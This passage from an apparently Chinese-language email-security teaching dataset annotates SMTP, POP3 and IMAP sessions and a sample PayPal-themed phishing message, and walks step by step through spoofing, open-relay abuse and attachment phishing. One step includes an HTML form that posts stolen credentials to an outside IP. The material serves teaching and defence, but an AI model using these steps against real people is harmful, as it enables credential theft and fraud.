44 41 54 41 0d 0a 33 35 34 20 45 6e 64 20 64 61 74 61 20 77 69 74 68 20 3c 43 52 3e 3c 4c 46 3e 2e 3c 43 52 3e 3c 4c 46 3e 0d 0a","fields":[{"name":"220","cn":"服务就绪","off":0,"len":46,"bits":"","tone":"code","desc":"服务器主动开口的第一行：3 位应答码 220 + 域名 + 软件标识。应答码首位 2 表示成功。","sec":"这一行的软件标识是免费的侦察情报：攻击者据此确定 Postfix 版本、可用的扩展与已知漏洞；加固时应裁剪 banner。"},{"name":"EHLO","cn":"扩展问候","off":46,"len":21,"bits":"","tone":"method","desc":"客户端自报域名，请求 ESMTP 扩展模式。EHLO 取代了旧的 HELO，服务器会以多行 250 应答列出支持的能力。","sec":"EHLO 里的域名完全由客户端填写、不被校验，因此不构成任何身份证明；它也常被用作探测服务器是否支持 STARTTLS/AUTH 的手段。"},{"name":"250-","cn":"扩展列表（多行）","off":67,"len":23,"bits":"","tone":"code","desc":"多行应答：连字符表示后面还有一行，最后一行用空格（250 SP）结束。","sec":"能力列表暴露服务器支持的认证方式与最大邮件尺寸；对攻击者而言，这是挑选后续手法的目录。"},{"name":"250-SIZE","cn":"最大邮件尺寸","off":90,"len":19,"bits":"","tone":"code","desc":"声明单封邮件上限约 10 MB。","sec":"上限过大会被用于塞入巨型附件撑爆邮箱配额（一种应用层资源耗尽）。"},{"name":"250-8BITMIME","cn":"8 位数据扩展","off":109,"len":14,"bits":"","tone":"code","desc":"允许在正文中直接使用 8 位字节，不必强制转成 7 位 ASCII。","sec":"与 MIME 的 Content-Transfer-Encoding 组合后，编码方式的选择权落在发件人手里——这正是“同一封邮件在不同客户端显示不同内容”的根源。"},{"name":"MAIL FROM","cn":"信封发件人","off":123,"len":32,"bits":"","tone":"header","desc":"信封（envelope）的逆向路径，服务器退信时用它。注意它与首部的 From 是两个完全独立的字段，可以不一致。","sec":"整条会话里没有任何一步验证“你是不是 alice@bank.example 的主人”。服务器最多检查域名语法，于是这个字段只是一句自称——邮件伪造的地基。"},{"name":"250 2.1.0","cn":"发件人已接受","off":155,"len":14,"bits":"","tone":"code","desc":"2.1.0 是增强状态码（RFC 3463），含义是“其他地址状态”。","sec":"增强状态码的细粒度差异可被用于枚举：同一无效地址在不同阶段返回 550 与 551，能推断邮箱是否存在。"},{"name":"RCPT TO","cn":"信封收件人","off":169,"len":28,"bits":"","tone":"header","desc":"每一封的实际投递对象。可以出现多次，每次一个收件人，服务器逐个应答。","sec":"RCPT TO 与首部 To 不一致是钓鱼的常规手法：显示给用户的是 To: ceo@corp.example，实际投递到攻击者控制的地址（或反之，密送泄露）。"},{"name":"250 2.1.5","cn":"收件人已接受","off":197,"len":14,"bits":"","tone":"code","desc":"2.1.5 = 目标地址有效。","sec":"收件人是否有效的即时反馈就是“账号枚举”接口；开放中继服务器尤其容易被批量探测。"},{"name":"DATA","cn":"开始传正文","off":211,"len":6,"bits":"","tone":"method","desc":"宣告即将发送邮件内容。服务器同意后会进入“数据模式”，逐行接收直到单独一行的句点。","sec":"数据模式没有长度前缀，只靠 \".\" 判定结束；发送方对行首的 \".\" 必须做点填充（dot-stuffing）。实现若漏掉这一步，正文里的一行 \".\" 会提前截断报文。"},{"name":"354","cn":"开始发送","off":217,"len":37,"bits":"","tone":"code","desc":"354 是唯一的“中间态”应答：既不是成功也不是失败，而是“继续说”。","sec":"服务器在 354 之后就要为可能到来的巨量数据预留资源；不设上限的实现可被单连接耗尽磁盘。"}]},{"title":"邮件报文（RFC 5322）：Received 链 + From/To/Subject + MIME 分段","note":"首部与主体之间用一个空行（两个连续 CRLF）分隔；multipart/mixed 用 boundary 把正文与附件切成互相独立的部分","hex":"52 65 74 75 72 6e 2d 50 61 74 68 3a 20 3c 62 6f 75 6e 63 65 40 70 61 79 70 61 6c 2d 73 65 63 75 72 65 2e 65 78 61 6d 70 6c 65 3e 0d 0a 52 65 63 65 69 76 65 64 3a 20 66 72 6f 6d 20 72 65 6c 61 79 2e 65 76 69 6c 2e 65 78 61 6d 70 6c 65 20 28 72 65 6c 61 79 2e 65 76 69 6c 2e 65 78 61 6d 70 6c 65 20 5b 34 35 2e 33 33 2e 31 32 2e 39 5d 29 0d 0a 09 62 79 20 6d 78 2e 63 6f 72 70 2e 65 78 61 6d 70 6c 65 20 77 69 74 68 20 45 53 4d 54 50 20 69 64 20 34 58 79 32 3b 20 4d 6f 6e 2c 20 32 37 20 4f 63 74 20 32 30 32 36 20 30 39 3a 31 32 3a 34 30 20 2b 30 38 30 30 0d 0a 46 72 6f 6d 3a 20 22 50 61 79 50 61 6c 20 53 65 72 76 69 63 65 22 20 3c 73 65 72 76 69 63 65 40 70 61 79 70 61 6c 2d 73 65 63 75 72 65 2e 65 78 61 6d 70 6c 65 3e 0d 0a 54 6f 3a 20 62 6f 62 40 63 6f 72 70 2e 65 78 61 6d 70 6c 65 0d 0a 53 75 62 6a 65 63 74 3a 20 59 6f 75 72 20 61 63 63 6f 75 6e 74 20 77 69 6c 6c 20 62 65 20 73 75 73 70 65 6e 64 65 64 20 69 6e 20 32 34 20 68 6f 75 72 73 0d 0a 44 61 74 65 3a 20 4d 6f 6e 2c 20 32 37 20 4f 63 74 20 32 30 32 36 20 30 39 3a 31 32 3a 33 33 20 2b 30 38 30 30 0d 0a 4d 65 73 73 61 67 65 2d 49 44 3a 20 3c 32 30 32 36 31 30 32 37 30 39 31 32 33 33 2e 31 61 32 62 40 70 61 79 70 61 6c 2d 73 65 63 75 72 65 2e 65 78 61 6d 70 6c 65 3e 0d 0a 4d 49 4d 45 2d 56 65 72 73 69 6f 6e 3a 20 31 2e 30 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 6d 75 6c 74 69 70 61 72 74 2f 6d 69 78 65 64 3b 20 62 6f 75 6e 64 61 72 79 3d 22 2d 2d 2d 2d 3d 5f 50 61 72 74 5f 31 22 0d 0a 0d 0a 2d 2d 2d 2d 2d 2d 3d 5f 50 61 72 74 5f 31 0d 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 74 65 78 74 2f 70 6c 61 69 6e 3b 20 63 68 61 72 73 65 74 3d 22 75 74 66 2d 38 22 0d 0a 43 6f 6e 74 65 6e 74 2d 54 72 61 6e 73 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 62 61 73 65 36 34 0d 0a 0d 0a 55 47 78 6c 59 58 4e 6c 49 48 5a 6c 63 6d 6c 6d 65 53 42 35 62 33 56 79 49 47 46 6a 59 32 39 31 62 6e 51 75 0d 0a 2d 2d 2d 2d 2d 2d 3d 5f 50 61 72 74 5f 31 2d 2d 0d 0a","fields":[{"name":"Return-Path","cn":"退回路径","off":0,"len":45,"bits":"","tone":"header","desc":"由最终投递的 MTA 依据信封 MAIL FROM 写入，用户看不到，退信按它走。","sec":"取证时它比 From 更可信：它由投递方写入，而 From 由发件人自己写。两者不一致即高度可疑。"},{"name":"Received","cn":"接收链（逐跳追加）","off":45,"len":142,"bits":"","tone":"header","desc":"每个经手的 MTA 在最上方追加一行，形成自下而上（时间由早到晚）的接力记录。以制表符开头的续行属于同一字段（折叠首部）。","sec":"Received 链是邮件取证的主干：它记录真实来源 IP 与跳数。但链上的行同样是“经手方自己写的”，最后一跳之前的每一行都可能被伪造，只有你信任的那台 MTA 追加的那一行才可靠。"},{"name":"From","cn":"显示发件人","off":187,"len":56,"bits":"","tone":"header","desc":"纯展示用字段：显示名 + 地址，完全由发件人填写。","sec":"这是最典型的欺骗点。显示名可写成 “PayPal Service”，地址却是 paypal-secure.example——与官方域只差三个字符；部分客户端只显示名，用户根本看不到地址。"},{"name":"To","cn":"显示收件人","off":243,"len":22,"bits":"","tone":"header","desc":"给人看的收件人，与信封 RCPT TO 不必一致。","sec":"不一致本身是正常现象（密送、邮件列表），因此不能单独作为判据；但“To 是 A、实际投递给 B”在钓鱼投递中极为常见。"},{"name":"Subject","cn":"主题","off":265,"len":53,"bits":"","tone":"header","desc":"一句话主题，可含 MIME 编码字（=?utf-8?B?...?=）承载非 ASCII 字符。","sec":"主题是社工话术的主战场：制造紧迫感（24 小时）、指向权威（account）、要求行动。编码字还可被用来做同形字攻击（视觉相同的西里尔字母域名）。"},{"name":"Date","cn":"日期","off":318,"len":39,"bits":"","tone":"header","desc":"发件人声称的发送时间，时区可随意标注。","sec":"该字段可任意伪造，且不参与投递判定；若它与最上方 Received 的时间矛盾，是伪造的强信号，也是时间线取证的关键比对点。"},{"name":"Message-ID","cn":"邮件唯一标识","off":357,"len":57,"bits":"","tone":"header","desc":"形如 <唯一串@生成方域名>，用于去重、串起会话（In-Reply-To/References）。","sec":"其中的域名部分暴露生成方，可辅助溯源；同一 Message-ID 出现在多封不同内容的邮件里，是批量伪造的痕迹。"},{"name":"MIME-Version","cn":"MIME 版本","off":414,"len":19,"bits":"","tone":"header","desc":"声明本邮件遵循 MIME 规范，值为 1.0。","sec":"缺失该字段时，部分老客户端会退回纯文本解析，反而“看不见”附件——这也是绕过某些过滤器的古老手法。"},{"name":"Content-Type","cn":"内容类型","off":433,"len":56,"bits":"","tone":"header","desc":"type/subtype 两段式，multipart 类型必须带 boundary 参数，用它作为各部分之间的分隔标记。","sec":"附件投递的入口：multipart/mixed 之下任何一段都可以是 application/octet-stream。过滤网关与邮件客户端对嵌套 multipart 的解析差异，是绕过检测的常见根源。"},{"name":"CRLF","cn":"空行（首部结束）","off":489,"len":2,"bits":"","tone":"pad","desc":"单独一行 CRLF：首部到此结束，其后全部是主体。","sec":"空行的位置是“首部与正文的分界”，也是头部注入攻击要挪动的那条线——正文里伪造的“From:”若被客户端重新解析，就能覆盖真实发件人。"},{"name":"boundary","cn":"分段起始标记","off":491,"len":16,"bits":"","tone":"pad","desc":"实际的分隔线是 \"--\" + boundary。它之后紧跟该部分的局部首部。","sec":"boundary 由发件人任意指定；若正文里恰好出现同样字符串，就会提前切断分段（MIME 混淆）。攻击者可故意构造这种碰撞，让网关看到一个干净的文本部分、客户端看到另一个。"},{"name":"Part-Content-Type","cn":"分段内容类型","off":507,"len":43,"bits":"","tone":"header","desc":"这一段是纯文本正文，字符集 utf-8。","sec":"charset 可被滥用于字符集混淆：网关按 UTF-8 解码、客户端按 GBK 解码，同一段字节呈现两种内容。"},{"name":"Part-CTE","cn":"分段传输编码","off":550,"len":35,"bits":"","tone":"header","desc":"把二进制或非 ASCII 数据编码成可打印字符，保证能通过只吃 7 位 ASCII 的 SMTP 通道。","sec":"base64 不是加密，只是编码：任何人可解。它却足以让基于明文关键字的过滤失效——因此网关必须先解码再检测。"},{"name":"CRLF","cn":"分段空行","off":585,"len":2,"bits":"","tone":"pad","desc":"该部分首部与正文的分界。","sec":"本字段在常见攻击中不作为独立手段。"},{"name":"base64","cn":"正文（编码后）","off":587,"len":38,"bits":"","tone":"data","desc":"解码后是 \"Please verify your account.\"，30 字节原文编码成 40 字节。","sec":"编码后的正文对日志与关键字过滤不可读；长度膨胀约 33%，也被用来让邮件“看起来更大”以触发配额问题。"},{"name":"boundary-end","cn":"分段结束标记","off":625,"len":18,"bits":"","tone":"pad","desc":"以 \"--\" + boundary + \"--\" 结尾，声明所有部分结束。","sec":"缺失结束标记会让部分解析器把后续内容全部吞进最后一段，形成“解析长度不一致”，可被用于隐藏第二个附件。"}]},{"title":"POP3 取信会话：+OK 状态行 + USER/PASS 明文口令 + RETR","note":"POP3 用 +OK / -ERR 两个词表达结果，所有命令与应答均为明文；这里按字节给出一次完整登录与取信","hex":"2b 4f 4b 20 50 4f 50 33 20 73 65 72 76 65 72 20 72 65 61 64 79 20 3c 31 38 39 36 2e 36 39 37 31 37 30 39 35 32 40 6d 61 69 6c 2e 62 61 6e 6b 2e 65 78 61 6d 70 6c 65 3e 0d 0a 55 53 45 52 20 62 6f 62 0d 0a 2b 4f 4b 20 75 73 65 72 20 61 63 63 65 70 74 65 64 0d 0a 50 41 53 53 20 73 33 63 72 33 74 0d 0a 2b 4f 4b 20 6d 61 69 6c 62 6f 78 20 6c 6f 63 6b 65 64 20 61 6e 64 20 72 65 61 64 79 0d 0a 53 54 41 54 0d 0a 2b 4f 4b 20 33 20 31 32 34 38 30 0d 0a 52 45 54 52 20 31 0d 0a 2b 4f 4b 20 31 32 34 30 20 6f 63 74 65 74 73 0d 0a","fields":[{"name":"+OK greeting","cn":"服务就绪","off":0,"len":58,"bits":"","tone":"code","desc":"服务器问候：+OK 表示成功，尖括号内是 APOP 用的时间戳。","sec":"时间戳用于 APOP 的挑战应答；若服务器不支持 APOP，客户端只能发明文 PASS——而很多客户端默认就是这么做的。"},{"name":"USER","cn":"用户名","off":58,"len":10,"bits":"","tone":"method","desc":"以明文提交用户名。","sec":"用户名字段直接暴露账号命名规则（姓名、工号、邮箱前缀），为后续撞库与钓鱼提供素材。"},{"name":"+OK user","cn":"用户名已接受","off":68,"len":19,"bits":"","tone":"code","desc":"授权阶段的中间应答。","sec":"不同实现对此处的错误措辞不一致（“no such user” vs “invalid login”），可被用来枚举有效账号。"},{"name":"PASS","cn":"口令（明文）","off":87,"len":13,"bits":"","tone":"key","desc":"口令以完全明文发送，仅受 Base64 之外的零保护。","sec":"这是 POP3 最致命的缺陷：同网段嗅探即可拿到账号口令，且用户往往在多处复用同一口令，一处泄露波及全部。"},{"name":"+OK locked","cn":"邮箱已锁定","off":100,"len":30,"bits":"","tone":"code","desc":"进入事务状态（TRANSACTION），邮箱被本会话独占。","sec":"“独占锁定”可被滥用：反复建立会话不退出，可让合法用户始终拿不到邮箱（一种轻量拒绝服务）。"},{"name":"STAT","cn":"查询状态","off":130,"len":6,"bits":"","tone":"method","desc":"请求邮件数量与总字节数。","sec":"返回值直接暴露邮箱规模与活跃度，是批量探测“这个账号是否在使用”的最省事手段。"},{"name":"+OK 3 12480","cn":"3 封 / 12480 字节","off":136,"len":13,"bits":"","tone":"code","desc":"3 封邮件，共 12480 字节。","sec":"本字段在常见攻击中不作为独立手段，但邮件数与字节数的突变可用于异常检测。"},{"name":"RETR 1","cn":"取第 1 封","off":149,"len":8,"bits":"","tone":"method","desc":"按序号取整封邮件（含首部与正文）。","sec":"POP3 的序号是“会话内序号”而非全局 UID，因此多设备各自取信时无法可靠去重——这也是它不适合多端同步的机制原因。"},{"name":"+OK 1240","cn":"1240 字节即将下发","off":157,"len":17,"bits":"","tone":"code","desc":"随后是多行应答，以一个单独的点行结束。","sec":"结束符判定同样依赖点行；正文里以 \".\" 开头的行必须做点填充，否则会被客户端提前截断。"}]},{"title":"IMAP4 取信会话：带标签的命令与 * 无标签应答","note":"IMAP 用客户端自定义标签（a1/a2/a3）配对命令与结果，邮件保留在服务器端，天然支持多端同步","hex":"2a 20 4f 4b 20 5b 43 41 50 41 42 49 4c 49 54 59 20 49 4d 41 50 34 72 65 76 31 20 53 54 41 52 54 54 4c 53 5d 20 73 65 72 76 65 72 20 72 65 61 64 79 0d 0a 61 31 20 4c 4f 47 49 4e 20 62 6f 62 20 73 33 63 72 33 74 0d 0a 61 31 20 4f 4b 20 4c 4f 47 49 4e 20 63 6f 6d 70 6c 65 74 65 64 0d 0a 61 32 20 53 45 4c 45 43 54 20 49 4e 42 4f 58 0d 0a 2a 20 33 20 45 58 49 53 54 53 0d 0a 61 32 20 4f 4b 20 5b 52 45 41 44 2d 57 52 49 54 45 5d 20 53 45 4c 45 43 54 20 63 6f 6d 70 6c 65 74 65 64 0d 0a 61 33 20 46 45 54 43 48 20 31 20 42 4f 44 59 5b 48 45 41 44 45 52 2e 46 49 45 4c 44 53 20 28 46 52 4f 4d 20 53 55 42 4a 45 43 54 29 5d 0d 0a","fields":[{"name":"* OK","cn":"服务就绪（无标签）","off":0,"len":51,"bits":"","tone":"code","desc":"无标签应答以 * 开头，表示“这是服务器主动告知的状态”。[CAPABILITY] 是响应码，声明支持的能力。","sec":"能力列表暴露是否支持 STARTTLS/IDLE 等；若声明了 STARTTLS 但证书校验不严，中间的剥离攻击即可降级为明文。"},{"name":"a1 LOGIN","cn":"登录命令","off":51,"len":21,"bits":"","tone":"method","desc":"标签 a1 + 命令 + 参数。口令同样是明文（引号字符串形式）。","sec":"IMAP 原生也是明文口令；在未升级 TLS 的 143 端口上，口令与邮件正文一样可被嗅探。加密必须靠 STARTTLS 或 993 端口的隐式 TLS。"},{"name":"a1 OK","cn":"登录完成（带标签）","off":72,"len":23,"bits":"","tone":"code","desc":"带标签应答与命令的标签一一对应，因此 IMAP 允许在同一条连接上并发多条命令。","sec":"标签错配会造成响应串线；某些客户端实现不校验标签，可被恶意服务器投喂错误的命令结果。"},{"name":"a2 SELECT","cn":"选择邮箱","off":95,"len":17,"bits":"","tone":"method","desc":"选择 INBOX，进入选中状态（SELECTED）。","sec":"访问控制在这一步生效：权限不足应返回 NO，实现若在此处只做界面隐藏而不做服务端校验，就能通过直接发命令越权。"},{"name":"3 EXISTS","cn":"邮件数","off":112,"len":12,"bits":"","tone":"code","desc":"无标签应答：邮箱内共 3 封邮件。","sec":"EXISTS 的变化可被用来判断账号活跃度与收信频率，是隐蔽侦察的低成本手段。"},{"name":"a2 OK","cn":"选择完成","off":124,"len":37,"bits":"","tone":"code","desc":"[READ-WRITE] 表示可写；若为 [READ-ONLY] 则只读。","sec":"读写权限由响应码声明，客户端据此决定是否允许删除/标记；服务端若不复核，攻击者可绕过只读限制。"},{"name":"a3 FETCH","cn":"取指定首部字段","off":161,"len":47,"bits":"","tone":"method","desc":"只取第 1 封邮件的 From 与 Subject 两个首部字段，不下载正文。","sec":"这种“按需取片段”的能力让客户端可以只同步首部，效率极高；但它也让邮件服务器必须支持任意 BODY[...] 子集查询，历史上出现过由此触发的解析漏洞与越界读。"}]}],"attacks":[{"name":"Open Relay Abuse","cn":"开放中继滥用","impact":"攻击者借你的邮件服务器向任意域投递，垃圾邮件与钓鱼信的来源变成你的域名与 IP，你的域被拉黑","steps":[{"who":"攻击者","to":"企业 MTA","label":"EHLO attacker.example","note":"先探能力：是否支持 AUTH、最大尺寸多少"},{"who":"企业 MTA","to":"攻击者","label":"250-mail.corp.example / 250-SIZE 10240000 / 250-AUTH PLAIN LOGIN","note":"服务器如实告知能力；若未要求认证即接受 MAIL FROM，中继就开着"},{"who":"攻击者","to":"企业 MTA","label":"MAIL FROM:<ceo@corp.example> + RCPT TO:<victim@other.example> ×5000","note":"信封发件人写成本域地址，收件人全是外部域——典型的“非本地到非本地”中继"},{"who":"企业 MTA","to":"外部 MX","label":"逐封投递 5000 封，源 IP 全是企业出口","note":"企业 IP 被第三方反垃圾组织列入黑名单，正常业务邮件开始被拒"},{"who":"受害者（收件人）","to":"—","label":"收到来自 corp.example 的钓鱼信，SPF 校验通过","note":"因为信确实是从该域的合法 IP 发出的，SPF 反而为攻击者背书"}],"defense":"关闭开放中继：只允许“已认证用户”或“本地域发往任意域/任意域发往本地域”两类投递，并对发信速率与收件人数设阈值。"},{"name":"Sender Spoofing","cn":"伪造发件人（信封与首部分离）","impact":"收件人看到的是 CEO 或银行的地址，邮件却来自攻击者的服务器，凭据与转账由此被骗走","steps":[{"who":"攻击者","to":"受害者所在域的 MX","label":"直接连 25 端口：EHLO evil.example","note":"绕过自己的 ISP 发信通道，直接与目标 MTA 对话，不受发送方策略约束"},{"who":"攻击者","to":"目标 MX","label":"MAIL FROM:<ceo@corp.example>","note":"信封发件人随手写成受害组织的域名，服务器只校验语法"},{"who":"攻击者","to":"目标 MX","label":"RCPT TO:<finance@corp.example> → 250 → DATA → 354","note":"投递链全部接受，因为没有任何一步要求证明“你有权代表 corp.example”"},{"who":"攻击者","to":"目标 MX","label":"正文首部：From: \"CEO Zhang\" <ceo@corp.example>，Subject: 紧急付款","note":"首部 From 与信封一致，看起来毫无破绽；显示名甚至比真实地址更可信"},{"who":"目标 MX","to":"财务人员","label":"投递入收件箱，客户端显示 CEO 姓名","note":"若该域未发布 SPF/DKIM，接收方无从判断；即便有，攻击者也可用相似域名绕过对齐"}],"defense":"发件域发布 SPF + DKIM + DMARC(p=reject)，接收方对未对齐的邮件拒收；客户端对“显示名与地址不一致”给出显式警示。"},{"name":"Attachment Phishing","cn":"附件钓鱼（MIME 伪装与凭据收割）","impact":"附件绕过基于链接的信誉检测，用户在本地打开后交出凭据或在终端执行恶意代码","steps":[{"who":"攻击者","to":"目标 MX","label":"Content-Type: multipart/mixed; boundary=\"----=_Part_1\"，第二段 Content-Type: application/pdf; name=\"invoice.pdf.exe\"","note":"双扩展名 + 声明类型与实际内容不符；网关按声明类型放行，Windows 按真实扩展名执行"},{"who":"网关","to":"邮件服务器","label":"按 application/pdf 做浅层检查后放行，仅追加 X-Spam-Score 首部","note":"首部被追加说明它被扫过，但这不代表内容安全——很多网关只看链接信誉"},{"who":"受害者","to":"本地","label":"打开附件，实际是一个 HTML 文件：<form action=\"http://45.33.12.9/collect\">","note":"HTML 附件在本地渲染时地址栏不显示真实 URL，钓鱼页看起来像官方登录页"},{"who":"受害者","to":"攻击者","label":"提交账号口令，POST 到 45.33.12.9","note":"凭据外带成功；由于是本地表单提交，浏览器的钓鱼拦截完全不参与"},{"who":"攻击者","to":"受害者邮箱","label":"用窃得的凭据登录，设置转发规则并把原信删除","note":"持久化：此后所有来信被静默抄送，受害者与 IT 都难以及时发现"}],"defense":"网关对附件做真实类型识别（魔数而非声明）并拆开 HTML/压缩包再检测，隔离未知附件在沙箱打开；终端禁用邮件目录下的可执行权限。"}],"defenses":[{"name":"SPF（RFC 7208）","how":"发件域在 DNS 的 TXT 记录里列出授权发信 IP（v=spf1 ip4:… include:… -all），接收方用信封发件人域名查询后用连接 IP 逐条匹配，得到 pass/fail/softfail/neutral 等结果。","limit":"只看 IP 不看内容，转发与邮件列表会破坏它（邮件从第三方 IP 发出即 fail）；DNS 查询有 10 次上限，复杂策略会被截断为 permerror；它校验的是信封域名，与用户看到的 From 可以完全无关。"},{"name":"DKIM（RFC 6376）","how":"发送方对选定首部与正文做规范化后计算散列，用域私钥签名写入 DKIM-Signature（v/a/b/bh/d/h/s 等标签），公钥放在 <selector>._domainkey.<domain> 的 TXT 里；接收方取公钥验签。","limit":"只证明“持有该域私钥者签过名、之后没被改动”，不证明发件人身份；签名可被整体剥除（除非 DMARC 要求），正文末尾追加内容也不破坏签名（l= 标签更宽松），因此“验签通过”不等于“信是安全的”。"},{"name":"DMARC","how":"发件域发布 _dmarc 记录，声明策略（none/quarantine/reject）、报告地址与对齐方式；接收方要求 SPF 或 DKIM 至少一项通过且与首部 From 的域对齐，再按策略处置并回传汇总报告。","limit":"只对“已发布策略的域”生效，大量域名根本没记录；攻击者改用相似域名（paypal-secure.example）时对齐检查完全通过；p=none 的域只是收集报告，不拦任何东西。"},{"name":"PGP / S-MIME（端到端加密与签名）","how":"PGP 用混合加密：随机对称密钥加密正文，收件人公钥加密该密钥，发件人私钥对摘要签名；S/MIME 用 X.509 证书做同样的签名与加密。两者都把机密性与抗否认做到消息级，中间任何一跳都读不到明文。","limit":"需要双方都有密钥对且能可信地交换公钥，普及率极低；私钥丢失即无法解密历史邮件；元数据（收发双方、主题、时间）仍暴露；且邮件客户端的密钥管理体验长期不佳，误用与配置错误常见。"},{"name":"STARTTLS + MTA-STS","how":"STARTTLS 在明文连接上升级为 TLS；MTA-STS 通过 DNS 与 HTTPS 发布“本域只接受 TLS 且证书须匹配”的策略，并对证书做校验，防止中间人剥离升级命令。","limit":"STARTTLS 之前的几步仍是明文，剥离攻击天然可行；MTA-STS 依赖对方 MTA 支持与策略缓存，首次投递与缓存过期窗口仍是攻击面；DANE/TLSA 又要求 DNSSEC，链条更长。"}],"calcs":[],"quiz":[{"q":"SMTP 会话里 MAIL FROM 写的是 ceo@corp.example，这是否能证明发件人就是该地址的主人？","options":["能，服务器会校验域名归属","不能，它只是一个字符串，服务器最多检查语法","只有在启用 TLS 时才能证明"],"a":1,"why":"SMTP 没有任何发件人认证步骤，MAIL FROM 与首部 From 都是自称；真实性只能靠后加的 SPF（IP 授权）、DKIM（签名）与 DMARC（对齐+策略）另行判断。"},{"q":"DKIM 验签通过，能否说明这封邮件是可信的？","options":["能，签名不可伪造","不能，它只证明由持该域私钥者签名且内容未被改动，不证明发件人身份或内容善意","不能，因为 DKIM 只校验正文不校验首部"],"a":1,"why":"DKIM 校验的是“签名域”而非“你期望的域”，攻击者用自己的域签名同样能通过；且签名可被整体剥除，正文追加内容也可能不破坏签名。"},{"q":"为什么 STARTTLS 无法彻底解决 SMTP 明文问题？","options":["因为 STARTTLS 不加密正文","因为升级前的握手是明文的，中间人可以剥离升级命令使双方退回明文","因为 STARTTLS 只支持 POP3"],"a":1,"why":"机会式加密的固有弱点：升级命令本身在明文里传输，剥离后双方仍能正常通信而互不察觉。因此必须配合 MTA-STS/DANE 这类“强制加密并校验证书”的策略。"}]},"script":{"id":"mail","notes":{"MAIL FROM":{"short":"信封发件人，只是一句自称","more":"逆向路径，服务器退信时用它。它与首部 From 是两个独立字段，可以不一致。整条会话没有任何一步验证“你是不是这个地址的主人”。","sec":"邮件伪造的地基：服务器最多检查域名语法。"},"RCPT TO":{"short":"实际投递对象，可多次出现","more":"每出现一次就是一个收件人，服务器逐个应答。它与首部 To 互不校验，“显示 A、投递给 B”在协议上完全合法。","sec":"密送、列表、转发都靠它；钓鱼也靠它。"},"EHLO":{"short":"自报域名，不构成身份证明","more":"请求进入 ESMTP 扩展模式，服务器用多行 250 应答列出支持的能力。域名完全由客户端填写、不被校验。","sec":"常被用来探测服务器是否支持 STARTTLS 与 AUTH。"},"Return-Path":{"short":"投递方写入，比 From 可信","more":"由最终投递的 MTA 依据信封 MAIL FROM 写入，收件人看不到，退信按它走。它是“别人替你写的字段”。","sec":"取证先看它：与首部 From 不一致即高度可疑。"},"Received":{"short":"逐跳追加的真实来源链","more":"每个经手 MTA 在最上方追加一行，形成时间由早到晚的接力记录，含真实来源 IP 与所用协议。以制表符开头的续行属于同一字段。","sec":"只有你信任的那台 MTA 追加的那一行可靠，其上每一行都可伪造。"},"From":{"short":"显示发件人，完全由发件人填","more":"纯展示用字段：显示名加地址。客户端多数只渲染显示名，地址被折叠或根本不显示，显示名可以写成任何机构。","sec":"写成 “PayPal Service” 而地址是 paypal-secure.example，是最典型的一类欺骗。"},"Subject":{"short":"社工话术的主战场","more":"一句话主题，可含 MIME 编码字承载非 ASCII。它直接决定收件人是否点开，因此集中了制造紧迫感与指向权威的所有话术。","sec":"“24 小时内停用账户”这类措辞，是钓鱼的固定配方。"},"Message-ID":{"short":"唯一标识，暴露生成方","more":"形如 <唯一串@生成方域名>，用于去重与串起会话。域名部分暴露了生成方，同一 ID 出现在多封不同内容的信里是批量伪造的痕迹。","sec":"多封信共用一个 Message-ID，就是群发的证据。"},"354":{"short":"唯一的中间态应答","more":"3 开头既不是成功也不是失败，而是“继续说”。服务器在此之后进入数据模式，为可能到来的任意长度内容预留资源。","sec":"不设上限的实现可被单条连接写满磁盘。"},"PASS":{"short":"明文口令，嗅探即得","more":"口令以完全明文发送，除 Base64 之外没有任何保护（它甚至不是 Base64）。同网段嗅探即可拿到账号口令。","sec":"用户常多处复用口令，一处泄露波及全部；只能靠 995 或 STARTTLS 兜。"}},"acts":[{"key":"normal","no":"第 1 幕","title":"它正常怎么工作","desc":"文本对话逐跳投递，信封管路由、首部管显示","lead":"先看一封信从提交到取回。注意信封与首部是两套地址，互不校验。","scenes":[{"name":"SMTP 投递 + POP3 取信","cmds":{"linux":[{"c":"swaks --to bob@corp.example --server mail.bank.example --auth LOGIN --tls","n":"一次走完 EHLO/MAIL/RCPT/DATA，每步应答都打出来","s":"补充（vault 无 swaks，SMTP 会话调试必备）"},{"c":"openssl s_client -connect mail.bank.example:25 -starttls smtp -quiet","n":"明文连上再升级，能亲眼看到 STARTTLS 前后差别","s":"补充（vault 无 openssl，STARTTLS 验证）"},{"c":"dig +short TXT corp.example","n":"看该域发布了什么 SPF/DKIM 策略","s":"补充（vault 无 dig，查 TXT 策略）"}],"ps":[{"c":"Resolve-DnsName corp.example -Type TXT","n":"Windows 侧读该域的 TXT 策略记录","s":"补充（vault 未收录 Resolve-DnsName）"},{"c":"Resolve-DnsName corp.example -Type MX","n":"看这个域的 MX 指向谁","s":"补充（vault 未收录 Resolve-DnsName）"}],"cmd":[{"c":"nslookup -type=txt corp.example","n":"SPF 就是一串 v=spf1 开头的 TXT","s":"《系统》Windows CMD.md · nslookup"},{"c":"nslookup -type=mx corp.example","n":"MX 记录决定信投给哪台服务器","s":"《系统》Windows CMD.md · nslookup"}]},"steps":[{"who":"发件客户端","to":"发件服务器","pkt":0,"bubble":"EHLO","hl":["220","EHLO"],"vals":{"220":"mail.bank.example ESMTP Postfix","EHLO":"client.example"},"say":"服务器先报 220，客户端 EHLO 自报域名，换回一张能力列表。","sub":"这行 banner 免费泄露了软件与版本。"},{"who":"发件客户端","to":"发件服务器","pkt":0,"bubble":"信封两地址","hl":["MAIL FROM","RCPT TO"],"vals":{"MAIL FROM":"<alice@bank.example>","RCPT TO":"<bob@corp.example>"},"say":"信封两个地址：退信寄给谁、实际投给谁，收件人都看不到。","sub":"服务器只校验域名语法，不验证归属。"},{"who":"发件客户端","to":"发件服务器","pkt":0,"bubble":"DATA","hl":["DATA","354"],"vals":{"DATA":"DATA","354":"End data with <CR><LF>.<CR><LF>"},"say":"DATA 进入数据模式，只靠单独一行的句点结束正文。","sub":"没有长度前缀，边界是一个字符。"},{"who":"收件 MTA","to":"收件人","pkt":1,"bubble":"首部 + 正文","hl":["Return-Path","Received","From","Subject"],"vals":{"Return-Path":"<alice@bank.example>","From":"\"Alice\" <alice@bank.example>","Subject":"Quarterly report"},"say":"投递时 MTA 补 Return-Path 与 